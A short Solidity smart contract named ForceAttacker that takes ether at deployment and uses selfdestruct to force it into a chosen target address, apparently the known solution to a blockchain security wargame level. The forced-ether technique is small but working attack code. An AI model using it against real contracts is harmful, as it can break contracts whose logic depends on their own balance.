// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {
    // Accept ETH at deployment
    constructor() payable {}

    // Send ETH to the target address using selfdestruct
    function destroy(address payable target) public {
        selfdestruct(target);
    }
}
